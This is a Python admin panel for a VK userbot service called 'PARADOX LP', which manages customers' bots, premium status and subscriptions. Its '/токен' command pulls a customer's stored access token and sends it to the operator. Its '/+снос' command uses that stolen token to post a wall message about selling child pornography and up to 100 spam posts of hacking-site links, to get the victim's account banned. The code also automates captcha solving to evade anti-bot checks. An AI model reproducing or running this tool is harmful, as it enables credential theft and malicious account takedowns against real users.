import sys
import os
import time
import requests 
import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
import re
import vk_captchasolver as vc
import random
import datetime




id_pid = os.getpid()
file = open('PID_OBM_LP_admin.txt', 'w+')
file.write(str(id_pid))
file.close()



def captcha_handler(captcha):


    captcha.get_image()
    url = captcha.get_url()
    r = requests.get(url, stream=True)
    out = open("captcha.jpg", "wb")
    out.write(r.content)
    out.close()


    try:
        random_time_sleep_captcha_main = random.randrange(3, 5)
        time.sleep(int(random_time_sleep_captcha_main))

        return captcha.try_again(vc.solve(image='captcha.jpg'))
        


    except Exception as e:
        random_time_sleep_captcha = random.randrange(5, 10)
        time.sleep(int(random_time_sleep_captcha))
        try:
            return captcha.try_again(vc.solve(image='captcha.jpg'))
        except Exception as e:
            random_time_sleep_captcha2 = random.randrange(8, 18)
            time.sleep(int(random_time_sleep_captcha2))
            return captcha.try_again(vc.solve(image='captcha.jpg'))


def off():
	try:
	    if os.path.isdir(str(aidd)) == True:
	        file = open(str(aidd) + '\\PID_OBM_LP.txt', 'r', encoding='utf-8')
	        a = file.read()
	        file.close()
	        os.system('taskkill /PID ' + str(a) + ' /F')
	        return
	    else:
	        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь не найден.', captcha_handler=captcha_handler)
	except Exception:
		pass

def off_for_sub():
	try:
	    if os.path.isdir(str(aidd)) == True:
	        file = open(str(aidd) + '\\PID_OBM_LP.txt', 'r', encoding='utf-8')
	        a = file.read()
	        file.close()
	        os.system('taskkill /PID ' + str(a) + ' /F')
	        return
	    else:
	        pass
	except Exception:
		pass


def on():
	try:
	    if os.path.isdir(str(aidd)) == True:
	        file = open(str(aidd) + '\\PID_OBM_LP.txt', 'r', encoding='utf-8')
	        a = file.read()
	        file.close()
	        os.system('taskkill /PID ' + str(a) + ' /F')
	        os.system('cd ' + str(aidd) + ' & start paradox.py')
	        return
	    else:
	        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь не найден.', captcha_handler=captcha_handler)
	except Exception:
	    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь не найден.', captcha_handler=captcha_handler)

def get_token():
	try:
		file = open(str(aidd) + '\\token.txt', 'r')
		tkkk = file.read()
		file.close()
		vk8.messages.send(peer_id=int(vk8.users.get()[0]['id']), message='Токен @id' + str(aidd) + ' (Пользователя): ' + str(tkkk), random_id=0, captcha_handler=captcha_handler)
		return
	except:
		vk8.messages.send(peer_id=int(vk8.users.get()[0]['id']), message='Токен @id' + str(aidd) + ' (Пользователя) не найден.', random_id=0, captcha_handler=captcha_handler)
		return

def ban():
	vk_session = vk_api.VkApi(token=d_tok)
	vk = vk_session.get_api()
	longpoll = VkLongPoll(vk_session,id)

	vk.wall.post(message="тут напиши про то как продашь чтонибудь незаконное например детское порно....")
	for i in range(100):
		try:
			vk.wall.post(message='vto.pe vkbot.ru olike.ru vkscripts.ru vkkrutilka.ru freelikes.online vlike.ru vk.io vzlomvk.social vkrutilka.ru vk.me vzlomvk.pro vzlomvk.co vzlom-vk.cc vkboost.com oliker.ru bosslike.ru vktarget.ru vkmix.com vk.com https://www.vzlomvk.org/?hash=Ge57gP8D https://vto.pe lolz.guru/threads/130970/ lolz.guru www.vzlomvk.org https://vk-ban-2253c7a0.xxhax.com/ www.vto.pe https://vk.io https://trashbox.ru/link/vk-me-android #сованикогданеспит #синийкит #тихийлес #явигре #примивигру', captcha_handler=captcha_handler)
			time.sleep(0.5)
		except Exception as ban:
			vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь забанен.', captcha_handler=captcha_handler)
			return

        
token = input('Введите токен Пользователя для Админ-Панели: ')

os.system('cls')

vk_session8 = vk_api.VkApi(token=token, captcha_handler=captcha_handler)
longpoll = VkLongPoll(vk_session8)
vk8 = vk_session8.get_api()


while True:
	try:
		for event in longpoll.listen():
		    if event.type == VkEventType.MESSAGE_NEW and event.from_me:
		        text_ev_ev = event.text
		        if text_ev_ev.startswith(f'/-саб'):           
		            your_string = event.text
		            removal_list = ["/-саб"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
			            message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
			            if 'reply_message' in message:
			                aidd=message['reply_message']['from_id']
			                try:
			                    vip_p = 'Бот @id' + str(aidd) + ' (пользователя) выключен.'
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
			                    off()
			                except Exception:
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)   
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    vip_p = 'Бот @id' + str(aidd) + ' (пользователя) выключен.'
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                    off()
		                except Exception:
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)   
		        elif text_ev_ev.startswith(f'/+прем'):           
		            your_string = event.text
		            removal_list = ["/+прем"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
			            message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
			            if 'reply_message' in message:
			                aidd=message['reply_message']['from_id']
			                try:
			                    file = open(str(aidd) + '\\status_my.txt', 'w+')
			                    file.write('1')
			                    file.close()
			                    vip_p = '@id' + str(aidd) + ' (Пользователь) получил статус PREMIUM.'
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
			                except Exception:
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)   
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    file = open(str(aidd) + '\\status_my.txt', 'w+')
		                    file.write('2')
		                    file.close()
		                    vip_p = '@id' + str(aidd) + ' (Пользователь) получил статус PREMIUM.'
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                except Exception:
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)
		        elif text_ev_ev.startswith(f'/-прем'):           
		            your_string = event.text
		            removal_list = ["/-прем"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
			            message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
			            if 'reply_message' in message:
			                aidd=message['reply_message']['from_id']
			                try:
			                    file = open(str(aidd) + '\\status_my.txt', 'w+')
			                    file.write('1')
			                    file.close()
			                    vip_p = '@id' + str(aidd) + ' (Пользователь лишён PREMIUM.)'
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
			                    
			                except Exception:
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)   
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    file = open(str(aidd) + '\\status_my.txt', 'w+')
		                    file.write('1')
		                    file.close()
		                    vip_p = '@id' + str(aidd) + ' (Пользователь лишён PREMIUM.)'
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                    
		                except Exception:
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)
		        elif text_ev_ev.startswith(f'/+саб'):           
		            your_string = event.text
		            removal_list = ["/+саб"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
			            message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
			            if 'reply_message' in message:
			                aidd=message['reply_message']['from_id']
			                try:
			                    vip_p = 'Бот @id' + str(aidd) + ' (пользователя) включён.'
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
			                    on()
			                except Exception:
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    vip_p = 'Бот @id' + str(aidd) + ' (пользователя) включён.'
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                    off()
		                except Exception:
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler) 
		        elif text_ev_ev.startswith(f'/+снос'):           
		            your_string = event.text
		            removal_list = ["/+снос"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
		                message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
		                if 'reply_message' in message:
		                    aidd=message['reply_message']['from_id']
		                    try:
			                    vip_p = 'Бот банит @id' + str(aidd) + ' (пользователя)'
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
			                    file4 = open(str(aidd) + '\\token.txt', 'r', encoding='utf-8')
			                    d_tok = file4.read()
			                    file4.close()
			                    if aidd == 573770768:
			                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Вы пытаетесь заблокировать Администратора', captcha_handler=captcha_handler)
			                    	break
			                    elif aidd == 569317:
			                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Сносу не подлежит', captcha_handler=captcha_handler)
			                    	break
			                    else:
			                    	pass
			                    	ban()
		                    except Exception as e:
		                        print(e)
		                        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler) 
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    vip_p = 'Бот банит @id' + str(aidd) + ' (пользователя)'
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                    file4 = open(str(aidd) + '\\token.txt', 'r', encoding='utf-8')
		                    d_tok = file4.read()
		                    file4.close()
		                    if aidd == 573770768:
		                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Вы пытаетесь заблокировать Администратора', captcha_handler=captcha_handler)
		                    	break
		                    elif aidd == 569317:
		                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Сносу не подлежит', captcha_handler=captcha_handler)
		                    	break
		                    else:
		                    	pass
		                    	ban()
		                except Exception as e:
		                    print(e)
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)  
		        elif text_ev_ev.startswith(f'/+подписка'):           
		            your_string = event.text
		            removal_list = ["/+подписка"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
			            message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
			            if 'reply_message' in message:
			                aidd=message['reply_message']['from_id']
			                try:
			                    
			                    file = open('sub_list.txt', 'r')
			                    j = file.read()
			                    file.close()
			                    if j.find(str(aidd)) != -1:
			                        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь и так обладатель подписки PARADOX LP', captcha_handler=captcha_handler)
			                        break
			                    else:
			                        pass
			                    file = open('sub_list.txt', 'a+')
			                    file.write(str(aidd) + '\n')
			                    file.close()
			                    vip_p = '@id' + str(aidd) + ' (Пользователь) стал обладателем подписки в PARADOX LP.'
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
			                    off_for_sub()
			                except Exception:
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)   
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    file = open('sub_list.txt', 'r')
		                    j = file.read()
		                    file.close()
		                    if j.find(str(aidd)) != -1:
		                        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь и так обладатель подписки PARADOX LP', captcha_handler=captcha_handler)
		                        break
		                    else:
		                        pass
		                    file = open('sub_list.txt', 'a+')
		                    file.write(str(aidd) + '\n')
		                    file.close()
		                    vip_p = '@id' + str(aidd) + ' (Пользователь) стал обладателем подписки в PARADOX LP.'
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                    off_for_sub()
		                except Exception:
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)      
		        elif text_ev_ev.startswith(f'/-подписка'):           
		            your_string = event.text
		            removal_list = ["/-подписка"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
		                message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
		                if 'reply_message' in message:
		                    aidd=message['reply_message']['from_id']
		                    try:
		                        
		                        file = open('sub_list.txt', 'r')
		                        j = file.read()
		                        file.close()
		                        if j.find(str(aidd)) != -1:
		                            pass
		                        else:
		                            vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь не был обладателем подписки в PARADOX LP', captcha_handler=captcha_handler)
		                            break
		                        with open("sub_list.txt", "r") as f:
		                            lines = f.readlines()
		                        with open("sub_list.txt", "w") as f:
		                            for line in lines:
		                                if line.strip("\n") != str(aidd):
		                                    f.write(line)

		                            vip_p = '@id' + str(aidd) + ' (Пользователь) лишён подписки в PARADOX LP.'
		                            vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                    except Exception:
		                        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)   
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    file = open('sub_list.txt', 'r')
		                    j = file.read()
		                    file.close()
		                    if j.find(str(aidd)) != -1:
		                        pass
		                    else:
		                        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Пользователь не был обладателем подписки в PARADOX LP', captcha_handler=captcha_handler)
		                        break
		                    with open("sub_list.txt", "r") as f:
		                         lines = f.readlines()
		                    with open("sub_list.txt", "w") as f:
		                        for line in lines:
		                            if line.strip("\n") != str(aidd):
		                                f.write(line)

		                        vip_p = '@id' + str(aidd) + ' (Пользователь) лишён подписки в PARADOX LP.'
		                        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message=vip_p, captcha_handler=captcha_handler)
		                except Exception:
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler) 
		        elif text_ev_ev.startswith(f'/токен'):           
		            your_string = event.text
		            removal_list = ["/токен"]
		            for word in removal_list:
		            	your_string = your_string.replace(word, "")
		            

		            us=event.user_id
		            if your_string == '':
		                message=vk8.messages.getById(message_ids=event.message_id)['items'][0]
		                if 'reply_message' in message:
		                    aidd=message['reply_message']['from_id']
		                    try:
			                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Информация отправлена в избранное', captcha_handler=captcha_handler)
			                    if aidd == 573770768:
			                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Вы пытаетесь получить токен Администратора', captcha_handler=captcha_handler)
			                    	break
			                    elif aidd == 569317:
			                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Нет', captcha_handler=captcha_handler)
			                    	break
			                    else:
			                    	pass
			                    	get_token()
		                    except Exception as e:
		                        print(e)
		                        vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler) 
		            else:            
		                try:
		                    removal_list = ["https://vk.com/"]
		                    for word in removal_list:
		                    	kk = your_string.replace(word, "")
		                    removal_list = ["@"]
		                    for word in removal_list:
		                    	kk2 = kk.replace(word, "")

		                    removal_list = ["vk.com/"]
		                    for word in removal_list:
		                    	kk = kk2.replace(word, "")

		                    if your_string.find("@") != -1:
		                    	result_t = kk.split('|')[1]
		                    	res_str = result_t.replace(']', '', 1)
		                    else:
		                    	res_str = kk


		                    aidd = vk8.utils.resolveScreenName(screen_name=res_str)['object_id']
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Информация отправлена в избранное.', captcha_handler=captcha_handler)
		                    if aidd == 57377068:
		                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Вы пытаетесь получить токен Администратора', captcha_handler=captcha_handler)
		                    	break
		                    elif aidd == 569317:
		                    	vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='Нет.', captcha_handler=captcha_handler)
		                    	break
		                    else:
		                    	pass
		                    	get_token()
		                except Exception as e:
		                    print(e)
		                    vk8.messages.edit(message_id=event.message_id, peer_id=event.peer_id, message='&#10060;Неверный короткий ник пользователя.', captcha_handler=captcha_handler)  
		        else:
		            pass
	except Exception as e:
		print(e)
		pass 
